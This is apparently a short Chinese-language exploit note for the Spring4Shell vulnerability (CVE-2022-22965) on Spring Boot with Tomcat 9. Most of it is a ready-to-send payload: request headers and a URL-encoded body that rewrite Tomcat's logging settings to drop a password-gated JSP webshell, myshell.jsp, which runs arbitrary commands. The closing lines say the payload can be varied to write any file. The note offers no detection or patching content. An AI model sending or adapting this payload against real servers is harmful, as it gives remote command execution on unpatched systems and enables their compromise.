# Spring RCE CVE-2022-22965

### 漏洞环境

环境信息
* springboot
* jdk11
* tomcat9.0.30

### payload
请求头配置
```shell
"suffix": "%>//",
"c1": "Runtime",
"c2": "<%",
"DNT": "1",
"Content-Type": "application/x-www-form-urlencoded",
```
请求体数据
```shell
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=myshell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

发送上述内容，即可在目标系统上成功写入webshell ，一般会在 `webapps\ROOT\myshell.jsp` 路径下

如果路径可控，通过变换payload 你可以写入任意你需要的文件  
主要是通过修改tomcat 日志记录格式，以日志的形式写入shell